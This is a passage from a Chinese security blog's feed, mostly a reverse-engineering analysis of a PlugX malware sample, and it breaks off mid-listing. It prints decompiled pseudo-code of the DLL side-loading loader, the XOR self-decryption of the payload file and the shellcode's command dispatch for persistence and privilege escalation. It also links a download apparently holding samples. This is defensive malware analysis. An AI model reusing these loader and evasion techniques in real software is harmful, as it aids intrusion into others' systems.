href="https://pan.baidu.com/s/1B0bHlgui3SaMOOSRMr8TnQ?pwd=ldsk">https://pan.baidu.com/s/1B0bHlgui3SaMOOSRMr8TnQ?pwd=ldsk</a><br>提取码：ldsk</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;本篇研究文章针对Kimsuky所使用的几个具有代表性的恶意软件样本进行分析，对Kimsuky组织所使用的常用攻击手段进行总结。&lt;/p&gt;</summary>
    
    
    
    <category term="样本分析" scheme="http://example.com/categories/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    
    
  </entry>
  
  <entry>
    <title>PlugX样本分析</title>
    <link href="http://example.com/2022/10/14/PlugX%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    <id>http://example.com/2022/10/14/PlugX%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/</id>
    <published>2022-10-14T11:31:28.998Z</published>
    <updated>2022-10-14T11:32:34.970Z</updated>
    
    <content type="html"><![CDATA[<p>PlugX是APT组织TA416等组织常用于恶意攻击的恶意软件家族，本片文章对PlugX某样本的恶意行为（在逆向角度）进行分析。</p><span id="more"></span><h1 id="PlugX样本分析"><a href="#PlugX样本分析" class="headerlink" title="PlugX样本分析"></a>PlugX样本分析</h1><p>PlugX是APT组织TA416等组织常用于恶意攻击的恶意软件家族，本片文章对PlugX某样本的恶意行为（在逆向角度）进行分析。</p><h2 id="样本信息"><a href="#样本信息" class="headerlink" title="样本信息"></a>样本信息</h2><p>样本的基本信息</p><table><thead><tr><th align="left">type</th><th>hash</th></tr></thead><tbody><tr><td align="left">SHA256:</td><td>00fbfaf36114d3ff9e2c43885341f1c02fade82b49d1cf451bc756d992c84b06</td></tr><tr><td align="left">MD5:</td><td>c1c9624b21f71e4565b941a37db3815a</td></tr><tr><td align="left">SHA1:</td><td>1c251974b2e6f110d96af5b23ad036954ba15e4e</td></tr></tbody></table><p>解压样本发现样本文件夹内有三个文件，分别是AvastSvc.exe、wsc.dll、AvastAuth.dat。下面对文件逐个进行分析。</p><h2 id="AvastSvc-exe"><a href="#AvastSvc-exe" class="headerlink" title="AvastSvc.exe"></a>AvastSvc.exe</h2><p>这是一个白文件，程序只有一个start函数，内容是导入wsc.dll，执行其run()函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __noreturn <span class="title function_">start</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  HMODULE v0; <span class="comment">// eax@1</span></span><br><span class="line">  HMODULE v1; <span class="comment">// esi@1</span></span><br><span class="line">  FARPROC v2; <span class="comment">// edi@2</span></span><br><span class="line">  LPWSTR v3; <span class="comment">// eax@3</span></span><br><span class="line">  DWORD v4; <span class="comment">// edi@3</span></span><br><span class="line"></span><br><span class="line">  v0 = LoadLibraryW(<span class="string">L&quot;wsc.dll&quot;</span>);</span><br><span class="line">  v1 = v0;</span><br><span class="line">  <span class="keyword">if</span> ( v0 )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = GetProcAddress(v0, <span class="string">&quot;_run@4&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v2 )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = GetCommandLineW();</span><br><span class="line">      v4 = ((<span class="type">int</span> (__stdcall *)(_DWORD))v2)(v3);</span><br><span class="line">      FreeLibrary(v1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v4 = GetLastError();</span><br><span class="line">      FreeLibrary(v1);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v4 = GetLastError();</span><br><span class="line">  &#125;</span><br><span class="line">  ExitProcess(v4);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到样本为了躲避检测采取了白+黑的方式进行，这也是许多恶意软件用来躲避检测的常见方式。</p><h2 id="wsc-dll"><a href="#wsc-dll" class="headerlink" title="wsc.dll"></a>wsc.dll</h2><p>先对dll文件进行静态分析</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_10001BF0</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  HMODULE v0; <span class="comment">// eax@1</span></span><br><span class="line">  FARPROC v1; <span class="comment">// eax@1</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [sp+0h] [bp-1ACh]@5</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [sp+Bh] [bp-1A1h]@1</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [sp+Bh] [bp-1A1h]@3</span></span><br><span class="line">  <span class="type">char</span> v6; <span class="comment">// [sp+Bh] [bp-1A1h]@5</span></span><br><span class="line">  CHAR String2; <span class="comment">// [sp+Ch] [bp-1A0h]@3</span></span><br><span class="line">  <span class="type">char</span> v8; <span class="comment">// [sp+Dh] [bp-19Fh]@3</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [sp+4Ch] [bp-160h]@3</span></span><br><span class="line">  _BYTE *v10; <span class="comment">// [sp+50h] [bp-15Ch]@3</span></span><br><span class="line">  CHAR String1; <span class="comment">// [sp+54h] [bp-158h]@1</span></span><br><span class="line">  <span class="type">char</span> v12; <span class="comment">// [sp+55h] [bp-157h]@1</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// [sp+15Ch] [bp-50h]@3</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v14; <span class="comment">// [sp+160h] [bp-4Ch]@5</span></span><br><span class="line">  <span class="type">char</span> v15; <span class="comment">// [sp+164h] [bp-48h]@1</span></span><br><span class="line">  <span class="type">char</span> v16; <span class="comment">// [sp+165h] [bp-47h]@1</span></span><br><span class="line">  <span class="type">char</span> v17; <span class="comment">// [sp+166h] [bp-46h]@1</span></span><br><span class="line">  <span class="type">char</span> v18; <span class="comment">// [sp+167h] [bp-45h]@1</span></span><br><span class="line">  <span class="type">char</span> v19; <span class="comment">// [sp+168h] [bp-44h]@1</span></span><br><span class="line">  <span class="type">char</span> v20; <span class="comment">// [sp+169h] [bp-43h]@1</span></span><br><span class="line">  <span class="type">char</span> v21; <span class="comment">// [sp+16Ah] [bp-42h]@1</span></span><br><span class="line">  <span class="type">char</span> v22; <span class="comment">// [sp+16Bh] [bp-41h]@1</span></span><br><span class="line">  <span class="type">char</span> v23; <span class="comment">// [sp+16Ch] [bp-40h]@1</span></span><br><span class="line">  <span class="type">char</span> v24; <span class="comment">// [sp+16Dh] [bp-3Fh]@1</span></span><br><span class="line">  <span class="type">char</span> v25; <span class="comment">// [sp+16Eh] [bp-3Eh]@1</span></span><br><span class="line">  CHAR ModuleName; <span class="comment">// [sp+170h] [bp-3Ch]@1</span></span><br><span class="line">  <span class="type">char</span> v27; <span class="comment">// [sp+171h] [bp-3Bh]@1</span></span><br><span class="line">  <span class="type">char</span> v28; <span class="comment">// [sp+172h] [bp-3Ah]@1</span></span><br><span class="line">  <span class="type">char</span> v29; <span class="comment">// [sp+173h] [bp-39h]@1</span></span><br><span class="line">  <span class="type">char</span> v30; <span class="comment">// [sp+174h] [bp-38h]@1</span></span><br><span class="line">  <span class="type">char</span> v31; <span class="comment">// [sp+175h] [bp-37h]@1</span></span><br><span class="line">  <span class="type">char</span> v32; <span class="comment">// [sp+176h] [bp-36h]@1</span></span><br><span class="line">  <span class="type">char</span> v33; <span class="comment">// [sp+177h] [bp-35h]@1</span></span><br><span class="line">  <span class="type">char</span> v34; <span class="comment">// [sp+178h] [bp-34h]@1</span></span><br><span class="line">  <span class="type">char</span> v35; <span class="comment">// [sp+17Ch] [bp-30h]@3</span></span><br><span class="line">  <span class="type">int</span> v36; <span class="comment">// [sp+17Dh] [bp-2Fh]@3</span></span><br><span class="line">  <span class="type">int</span> v37; <span class="comment">// [sp+184h] [bp-28h]@5</span></span><br><span class="line">  <span class="type">int</span> v38; <span class="comment">// [sp+188h] [bp-24h]@1</span></span><br><span class="line">  <span class="type">int</span> v39; <span class="comment">// [sp+18Ch] [bp-20h]@3</span></span><br><span class="line">  CHAR ProcName; <span class="comment">// [sp+190h] [bp-1Ch]@1</span></span><br><span class="line">  <span class="type">char</span> v41; <span class="comment">// [sp+191h] [bp-1Bh]@1</span></span><br><span class="line">  <span class="type">char</span> v42; <span class="comment">// [sp+192h] [bp-1Ah]@1</span></span><br><span class="line">  <span class="type">char</span> v43; <span class="comment">// [sp+193h] [bp-19h]@1</span></span><br><span class="line">  <span class="type">char</span> v44; <span class="comment">// [sp+194h] [bp-18h]@1</span></span><br><span class="line">  <span class="type">char</span> v45; <span class="comment">// [sp+195h] [bp-17h]@1</span></span><br><span class="line">  <span class="type">char</span> v46; <span class="comment">// [sp+196h] [bp-16h]@1</span></span><br><span class="line">  <span class="type">char</span> v47; <span class="comment">// [sp+197h] [bp-15h]@1</span></span><br><span class="line">  <span class="type">char</span> v48; <span class="comment">// [sp+198h] [bp-14h]@1</span></span><br><span class="line">  <span class="type">char</span> v49; <span class="comment">// [sp+199h] [bp-13h]@1</span></span><br><span class="line">  <span class="type">char</span> v50; <span class="comment">// [sp+19Ah] [bp-12h]@1</span></span><br><span class="line">  <span class="type">char</span> v51; <span class="comment">// [sp+19Bh] [bp-11h]@1</span></span><br><span class="line">  <span class="type">char</span> v52; <span class="comment">// [sp+19Ch] [bp-10h]@1</span></span><br><span class="line">  <span class="type">char</span> v53; <span class="comment">// [sp+19Dh] [bp-Fh]@1</span></span><br><span class="line">  <span class="type">char</span> v54; <span class="comment">// [sp+19Eh] [bp-Eh]@1</span></span><br><span class="line">  <span class="type">char</span> v55; <span class="comment">// [sp+19Fh] [bp-Dh]@1</span></span><br><span class="line">  <span class="type">char</span> v56; <span class="comment">// [sp+1A0h] [bp-Ch]@1</span></span><br><span class="line">  <span class="type">char</span> v57; <span class="comment">// [sp+1A1h] [bp-Bh]@1</span></span><br><span class="line">  <span class="type">char</span> v58; <span class="comment">// [sp+1A2h] [bp-Ah]@1</span></span><br><span class="line">  _BYTE *v59; <span class="comment">// [sp+1A8h] [bp-4h]@1</span></span><br><span class="line"></span><br><span class="line">  v15 = <span class="string">&#x27;\\&#x27;</span>;</span><br><span class="line">  v16 = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">  v17 = <span class="string">&#x27;v&#x27;</span>;</span><br><span class="line">  v18 = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">  v19 = <span class="string">&#x27;s&#x27;</span>;</span><br><span class="line">  v20 = <span class="string">&#x27;t&#x27;</span>;</span><br><span class="line">  v21 = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">  v22 = <span class="string">&#x27;u&#x27;</span>;</span><br><span class="line">  v23 = <span class="string">&#x27;t&#x27;</span>;</span><br><span class="line">  v24 = <span class="string">&#x27;h&#x27;</span>;</span><br><span class="line">  v25 = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">  String1 = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">  sub_10002680(&amp;v12, <span class="number">0</span>, <span class="number">0x103</span>u);</span><br><span class="line">  ModuleName = <span class="string">&#x27;k&#x27;</span>;</span><br><span class="line">  v27 = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">  v28 = <span class="string">&#x27;r&#x27;</span>;</span><br><span class="line">  v29 = <span class="string">&#x27;n&#x27;</span>;</span><br><span class="line">  v30 = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">  v31 = <span class="string">&#x27;l&#x27;</span>;</span><br><span class="line">  v32 = <span class="string">&#x27;3&#x27;</span>;</span><br><span class="line">  v33 = <span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">  v34 = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">  v38 = <span class="number">9</span>;</span><br><span class="line">  ProcName = <span class="string">&#x27;G&#x27;</span>;</span><br><span class="line">  v41 = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">  v42 = <span class="string">&#x27;t&#x27;</span>;</span><br><span class="line">  v43 = <span class="string">&#x27;M&#x27;</span>;</span><br><span class="line">  v44 = <span class="string">&#x27;o&#x27;</span>;</span><br><span class="line">  v45 = <span class="string">&#x27;d&#x27;</span>;</span><br><span class="line">  v46 = <span class="string">&#x27;u&#x27;</span>;</span><br><span class="line">  v47 = <span class="string">&#x27;l&#x27;</span>;</span><br><span class="line">  v48 = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">  v49 = <span class="string">&#x27;F&#x27;</span>;</span><br><span class="line">  v50 = <span class="string">&#x27;i&#x27;</span>;</span><br><span class="line">  v51 = <span class="string">&#x27;l&#x27;</span>;</span><br><span class="line">  v52 = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">  v53 = <span class="string">&#x27;N&#x27;</span>;</span><br><span class="line">  v54 = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">  v55 = <span class="string">&#x27;m&#x27;</span>;</span><br><span class="line">  v56 = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">  v57 = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">  v58 = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">  v0 = GetModuleHandleA(&amp;ModuleName);</span><br><span class="line">  v1 = GetProcAddress(v0, &amp;ProcName);</span><br><span class="line">  (v1)(<span class="number">0</span>, &amp;String1, <span class="number">260</span>);</span><br><span class="line">  v59 = sub_10002660(&amp;String1, <span class="string">&#x27;\\&#x27;</span>);           <span class="comment">// 指向路径</span></span><br><span class="line">  v4 = <span class="number">-8</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v59 )</span><br><span class="line">  &#123;</span><br><span class="line">    *v59 = <span class="number">0</span>;</span><br><span class="line">    v4 = <span class="number">-113</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v35 = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">  v36 = <span class="string">&#x27;tad&#x27;</span>;</span><br><span class="line">  v38 = <span class="number">5</span>;</span><br><span class="line">  String2 = <span class="number">0</span>;</span><br><span class="line">  sub_10002680(&amp;v8, <span class="number">0</span>, <span class="number">0x3F</span>u);</span><br><span class="line">  v9 = sub_10002D40(&amp;v15);</span><br><span class="line">  sub_10002C10(&amp;String2, &amp;v15, v9);</span><br><span class="line">  sub_10002AD0(&amp;String2, &amp;v35, <span class="number">4u</span>);             <span class="comment">// AvastAuth.dat</span></span><br><span class="line">  lstrcatA(&amp;String1, &amp;String2);</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  v39 = <span class="number">0</span>;</span><br><span class="line">  v13 = <span class="number">0</span>;</span><br><span class="line">  sub_10001000(&amp;String1, &amp;v39, &amp;v13);           <span class="comment">// 打开文件并对文件进行读操作</span></span><br><span class="line">  v5 = (((((((<span class="number">-38</span> * ((<span class="number">-26</span> * (((v4 ^ <span class="number">0xE5</span> | <span class="number">0xF5</span>) ^ <span class="number">0x4C</span>) &gt;&gt; <span class="number">4</span>) | <span class="number">0xCE</span>) + <span class="number">76</span>) - <span class="number">34</span>) &amp; <span class="number">0x6D</span>) - <span class="number">19</span>) / <span class="number">39</span> &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0xC9</span>) + <span class="number">60</span>) ^ <span class="number">0xCF</span>)</span><br><span class="line">     / <span class="number">171</span></span><br><span class="line">     / <span class="number">101</span></span><br><span class="line">     / <span class="number">178</span></span><br><span class="line">     / <span class="number">146</span></span><br><span class="line">     - <span class="number">14</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !v13 )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_10002A4D(<span class="number">0</span>);</span><br><span class="line">    v5 &amp;= <span class="number">0x7B</span>u;</span><br><span class="line">  &#125;</span><br><span class="line">  v37 = v39;</span><br><span class="line">  v14 = sub_10002D40(v39);</span><br><span class="line">  v13 = v13 - v14 - <span class="number">1</span>;</span><br><span class="line">  v39 += v14 + <span class="number">1</span>;</span><br><span class="line">  v10 = LocalAlloc(<span class="number">0x40</span>u, v13 + <span class="number">1</span>);</span><br><span class="line">  v6 = (((<span class="number">4</span> * ((((v5 + <span class="number">19</span>) ^ <span class="number">0xC4</span>) &gt;&gt; <span class="number">5</span>) | <span class="number">0xBA</span>) &amp; <span class="number">0x34</span>) - <span class="number">61</span>) &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0xCD</span>;<span class="comment">// 自解密算法</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v13; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v10[i] = *(i + v39);</span><br><span class="line">    v10[i] ^= *(v37 + i % v14);</span><br><span class="line">    v6 = (v6 ^ <span class="number">0x3A</span>) / <span class="number">137</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> sub_100015D0(v10, v13);                <span class="comment">// 获得读写权限</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数sub_10001000对.dat文件进行读操作，读取的值作为中间值进行了自解密运算，保存到v10中，最后获取读写操作权限。</p><p>下面我们进行动态分析在v10下断点找到shellcode进行提取。这个时候eax保存的值就是shellcode生成的地址，edx存储的是shellcode的长度。二进制复制到010editor上保存文件可以得到shellcode</p><h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><p>下面对生成的dll行为进行分析，先找到入口函数DllMain()，比较容易的找到关键函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">DllMain</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [esp+0h] [ebp-18h]</span></span><br><span class="line">  <span class="type">void</span> *v3; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="type">void</span> *v5; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [esp+10h] [ebp-8h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [esp+14h] [ebp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  unknown_libname_2();</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  v0 = exec_GetCommandLineW();                  <span class="comment">// 当前进程命令行字符串</span></span><br><span class="line">  v6 = exec_CommandLineToArgvW(v0, &amp;v7);</span><br><span class="line">  <span class="keyword">switch</span> ( v7 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      run_self();                               <span class="comment">// 创建三个文件，并设置文件夹自启动</span></span><br><span class="line">      exec_ExitProcess(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      v5 = sub_1000C3E0();</span><br><span class="line">      v4 = exec_CreateMutexW(<span class="number">0</span>, <span class="number">0</span>, v5);         <span class="comment">// 创建互斥体</span></span><br><span class="line">      <span class="keyword">if</span> ( exec_GetLastError() == <span class="number">0xB7</span> )</span><br><span class="line">        exec_ExitProcess(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !exec_memcmp(*(v6 + <span class="number">4</span>), <span class="string">L&quot;-net&quot;</span>, <span class="number">8</span>) )<span class="comment">// 第四个参数是-net执行下面操作</span></span><br><span class="line">      &#123;</span><br><span class="line">        Reg_Network();                          <span class="comment">// Control/Network写入注册表值</span></span><br><span class="line">        run_self();                             <span class="comment">// 创建三个文件，并设置文件夹自启动</span></span><br><span class="line">        exec_ExitProcess(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      sub_100153A0();                           <span class="comment">// 提权、删除文件、获取计算机基本信息</span></span><br><span class="line">      sub_100019B0(<span class="number">0</span>);                          <span class="comment">// 套接字相关函数，相关注册表值</span></span><br><span class="line">      exec_CloseHandle(v4);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      sub_10015400(*(v6 + <span class="number">4</span>));</span><br><span class="line">      v3 = sub_1000C3E0();</span><br><span class="line">      v2 = exec_CreateMutexW(<span class="number">0</span>, <span class="number">0</span>, v3);         <span class="comment">// 创建互斥体</span></span><br><span class="line">      <span class="keyword">if</span> ( exec_GetLastError() != <span class="number">0xB7</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        exec_CloseHandle(v2);</span><br><span class="line">        run_self();</span><br><span class="line">      &#125;</span><br><span class="line">      exec_ExitProcess(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  unknown_libname_1();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数经过分析后采取了比较易读的命名方式。下面对关键函数进行依次分析。</p><p>在上面的代码中，这个程序要获取当前进程的命令行字符串，使用switch来进行流程的执行。</p><p>v7 &#x3D; 1时执行case 1操作</p><h3 id="case1"><a href="#case1" class="headerlink" title="case1"></a>case1</h3><h4 id="run-self-函数"><a href="#run-self-函数" class="headerlink" title="run_self()函数"></a>run_self()函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span 